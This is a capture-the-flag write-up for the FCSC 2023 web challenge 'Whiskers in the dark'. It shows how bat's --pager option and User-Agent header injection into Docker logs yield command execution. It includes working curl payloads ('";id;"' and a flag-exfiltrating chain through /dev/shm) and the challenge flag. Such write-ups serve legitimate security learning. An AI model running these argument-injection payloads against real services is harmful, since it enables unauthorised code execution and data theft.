---
source: kevin-mizu
source_url: https://mizu.re/post/whiskers-in-the-dark
title: "Whiskers in the dark | mizu.re"
description: "Whiskers in the dark"
---

_keyboard\_arrow\_up_

title: Whiskers in the dark

date: Apr 26, 2023

tags: [Writeup](https://mizu.re/tag/Writeup) [Web](https://mizu.re/tag/Web) [RCE](https://mizu.re/tag/RCE) [FCSC2023](https://mizu.re/tag/FCSC2023)

# Whiskers in the dark

![](https://mizu.re/articles/writeups/FCSC2023/whiskers_in_the_dark/images/logo-fcsc2023.png)

* * *

Difficulty: XXX points \| X solves

Description: Tandis qu'Alice errait dans le monde magique du Pays des merveilles, elle tomba sur un chat mystérieux et énigmatique. Ses mots étaient enveloppés de devinettes qui n'avaient aucun sens pour Alice, mais elle était déterminée. Avec un désir de découvrir les secrets du chat, elle se résolut à utiliser ses compétences pour dénouer le mystère.

Source: [here](https://mizu.re/post/whiskers-in-the-dark).

Author: [BitK\_](https://twitter.com/BitK_)

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/whiskers-in-the-dark#%EF%B8%8F-recon)
- [🐈‍⬛ Batcat](https://mizu.re/post/whiskers-in-the-dark#-batcat)
- [🩹 Fails](https://mizu.re/post/whiskers-in-the-dark#-fails)
- [🚀 Docker logs to the moon](https://mizu.re/post/whiskers-in-the-dark#-docker-logs-to-the-moon)
- [💥 Exploit summary](https://mizu.re/post/whiskers-in-the-dark#-exploit-summary)
- [🚩 Retrieving the flag](https://mizu.re/post/whiskers-in-the-dark#-retrieving-the-flag)
- [🙏 Acknowledgements](https://mizu.re/post/whiskers-in-the-dark#-acknowledgements)

## 🕵️ Recon

As the same as [Tweedle Dee](https://mizu.re/post/mizu.re/post/tweedle-dee), this challenge is very minimalist with an empty home page.

![home.png](https://mizu.re/articles/writeups/FCSC2023/whiskers_in_the_dark/images/home.png)

Luckily, we also have the source code for this, making it simpler to see what we can do with this web application.

- public/src/index.js

```js
import express from "express";
import { execFile } from "child_process";
import morgan from "morgan";

const app = express();

app.use(morgan("combined"));
app.set("trust proxy", true);

app.use(express.static("public"));

app.get("/fortune", (req, res) => {
  const args = ["--color", "never"].concat(req.query.f);

  if (args.some((arg) => arg.match(/[^a-z0-9.,/_=\-]/i))) {
    return res.status(400).send({ error: "Invalid filename." });
  }

  execFile("bat", args, { cwd: "./fortunes" }, (error, stdout, stderr) => {
    if (error) {
      res.status(500).send({ error: stderr });
    } else {
      res.send({ fortune: stdout });
    }
  });
});

app.listen(2204, () => {
  console.log("App listening on port 2204!");
});
```

As we can see from the above snippet, the web application also has a /fortune endpoint which executes the [batcat](https://github.com/sharkdp/bat) binary using our input as arguments. Two important things can be noticed from it:

- Our input is filtered by a regex (/\[^a-z0-9.,/\_=-\]/i) which only allows few character numbers: 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.,/\_=-.
- The shell option of [child\_process.execFile](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback) isn't activated, making impossible basic bash injection even with a regex bypass.
- The directory in which the command is executed is /app/fortunes, it contains a list of .txt files.

```js
// Working
require("child_process").execFile("ls", ["> /tmp/x"], {
  "shell": true
})

// Not working
require("child_process").execFile("ls", ["> /tmp/x"])
```

In addition, it is useless to try finding prototype pollution / poisoning issues as [express](https://github.com/expressjs/express) use [qs](https://github.com/ljharb/qs) to parse query string which is pretty secure since version [6.10.3](https://security.snyk.io/vuln/SNYK-JS-QS-3153490). So, the only way to solve this challenge seems to find a way to abuse batcat default arguments.

Finally, the final objective of the challenge is to read the content of a randomly named file inside the root folder.

- public/Dockerfile

```
RUN apk add --update --no-cache    \
    bat=0.22.1-r1               && \
    yarn install                && \
    yarn cache clean            && \
    echo $FLAG > "/flag-$(head /dev/urandom | md5sum | head -c 32).txt"
```

## 🐈‍⬛ Batcat

The [batcat](https://github.com/sharkdp/bat) binary is a cat clone with a syntax highlighting and Git integration written in rust. The binary as the following possible arguments: (some parts have been retracted, full output [here](https://github.com/sharkdp/bat/blob/6428125827cf4818974e45e3aa4f8803c0436620/doc/long-help.txt))

- bat --help

```python
USAGE:
    batcat [OPTIONS] [FILE]...
    batcat <SUBCOMMAND>

OPTIONS:
    # retracted

        --paging <when>
            Specify when to use the pager. To disable the pager, use --paging=never' or its
            alias,'-P'. To disable the pager permanently, set BAT_PAGER to an empty string. To
            control which pager is used, see the '--pager' option. Possible values: *auto*, never,
            always.
        --pager <command>
            Determine which pager is used. This option will override the PAGER and BAT_PAGER
            environment variables. The default pager is 'less'. To control when the pager is used,
            see the '--paging' option. Example: '--pager "less -RF"'.

    # retracted
ARGS:
    <FILE>...
            File(s) to print / concatenate. Use a dash ('-') or no argument at all to read from
            standard input.

SUBCOMMANDS:
    cache    Modify the syntax-definition and theme cache
```

From the above output, an interesting argument might catch your eyes: --pager . This argument is used to define a binary which is going to be used for the batcat paging if the output is too long. In addition, the --paging {when} argument allows to define when this paging should be used. Thus, executing --pager id --paging always /etc/passwd return the output of the id command! 🎉

![id.png](https://mizu.re/articles/writeups/FCSC2023/whiskers_in_the_dark/images/id.png)

## 🩹 Fails

At this point, I thought the challenge was over since I achieved Remote Code Execution on the server, but I was mistaken! As mentioned earlier, there are many restrictions that make it impossible to exploit initially.

I believe discussing inconclusive ideas can be interesting as well, so I've written this section to list some of them.

- Read batcat source code to understand how does arguments are sent to the pager command:

I found an issue ( [#354](https://github.com/sharkdp/bat/pull/354)) discussing the addition of arguments to the pager features, but as expected, it requires blocked characters to proceed further. Additionally, I discovered that --RAW-CONTROL-CHARS, --quit-if-one-screen and --no-init are added automatically if less (the default pager value) is used for the paging ( [ref](https://github.com/sharkdp/bat/blob/0b44aa6f68ab967dd5d74b7e02d306f2b8388928/tests/syntax-tests/source/Rust/output.rs#L67)). However, this couldn't be abused in any way.

- Abuse bash / sh features:

Knowing that bash has many interesting variables and shortcuts, I tried to exploit them in some way. For example:

1) History strings concatenation (doesn't work on sh):

```bash
d
i
!-1!-2
```

![history.png](https://mizu.re/articles/writeups/FCSC2023/whiskers_in_the_dark/images/history.png)

2) ? substitution: Although ? wasn't included in the allowed list, I searched for a character with the same behavior because it could enable me to leak the flag filename through an oracle. (I didn't find any allowed characters for exploitation)"

```nash
touch flag_aze65654aze34.txt
./flag_aze65654aze3?.txt
./flag_aze65654aze2?.txt
```

![oracle.png](https://mizu.re/articles/writeups/FCSC2023/whiskers_in_the_dark/images/oracle.png)

3) ...

Sadly, as [alpine](https://www.alpinelinux.org/about/) is really minimalist and only has sh, I didn't find anything that can be abused in that context of restricted characters.

- Abuse environment variables:

I found that it was possible to use the BAT\_PAGER global environment variable to change the pager binary which has to be used. Unfortunately, there is no way to set global variable as we need space to do export BAT\_PAGER=ls. In addition, even if that was possible, it would break the remote instance and give the flag to anyone that trigger paging binary without specifying --pager argument. Which obviously can't be an expected solution...

- Find interesting bash gadgets:

An interesting aspect of paging in batcat is that it pipes the content of the file into the pager binary. So, if I could find a bash script that, for example, lists the root directory, I would be able to obtain the flag file name et retrieve its content through the /fortune endpoint. Unfortunately, I didn't find anything interesting.

- Find a way to abuse logs or anything else reflected in a file:

This is where I lost the most of my time trying to find an interesting file in /proc/1 in which I could partially control the content via my HTTP request because sh doesn't stop when it faces invalid code.

![sh.png](https://mizu.re/articles/writeups/FCSC2023/whiskers_in_the_dark/images/sh.png)

Again, I didn't find anything until I realize that I haven't downloaded the last version of the challenge...

## 🚀 Docker logs to the moon

After running the new instance of the web application and accessing it, I saw the following:

![docker_logs.png](https://mizu.re/articles/writeups/FCSC2023/whiskers_in_the_dark/images/docker_logs.png)

Why is this game changer? Because we can abuse the way docker retrieves [logs](https://docs.docker.com/config/containers/logging/) for the main environment! 🔥

> How does docker's logs can be abused here?

In fact, in case of a non-interactive process such as a web server, logs might be sent into STDOUT and STDERR ( [ref](https://docs.docker.com/config/containers/logging/)). Because the new docker version is in this configuration, and we control some parts of the logged data, it might be possible to pipe it into sh via --pager!

![proc_fd.png](https://mizu.re/articles/writeups/FCSC2023/whiskers_in_the_dark/images/proc_fd.png)

As we can see from the above output, the User-Agent could be a good candidate because, escaping the double quote context would result in a valid sh instruction!

- curl command to abuse the User-Agent header

```sh
curl -H 'User-Agent: ";id;"' "http://localhost:2204/"
```

- output

![ua.png](https://mizu.re/articles/writeups/FCSC2023/whiskers_in_the_dark/images/ua.png)

## 💥 Exploit summary

Sadly, the remote instance doesn't have internet and the docker is started in read-only mode... Therefore, even if a docker is in read-only mode, processes need to have shared writable memory to communicate. On linux, a special folder exists for this: /dev/shm (more details [here](https://superuser.com/questions/45342/when-should-i-use-dev-shm-and-when-should-i-use-tmp)).

Thus, if we sum up, the final exploit should look like this:

![exploit.png](https://mizu.re/articles/writeups/FCSC2023/whiskers_in_the_dark/images/exploit.png)

## 🚩 Retrieving the flag

```py
# Setup a thread waiting for docker logs
curl 'https://whiskers-in-the-dark.france-cybersecurity-challenge.fr/fortune?f[]=--pager&f[]=sh&f[]=--paging&f[]=always&f[]=/proc/1/fd/1' &

# Send several request with the command to execute
for i in {1..10}; do curl -H 'User-Agent: ";cat /flag* > /dev/shm/x.txt;"' "https://whiskers-in-the-dark.france-cybersecurity-challenge.fr/" > /dev/null; done

# Retrieve the flag
curl "https://whiskers-in-the-dark.france-cybersecurity-challenge.fr/fortune?f=/dev/shm/x.txt"
```

Flag: FCSC{3304136851549bd73b64d4f2e86a7bd18e290d510220752ab2b061e591c2911c}

## 🙏 Acknowledgements

I would like to thank the person responsible for the CTF infrastructure who added the [morgan](https://github.com/expressjs/morgan) library to the web application. Without it, it would have been impossible to exploit the docker logs 💙

[_keyboard\_arrow\_left_ Simple Notes](https://mizu.re/post/simple-notes)

[Tweedle Dee _keyboard\_arrow\_right_](https://mizu.re/post/tweedle-dee)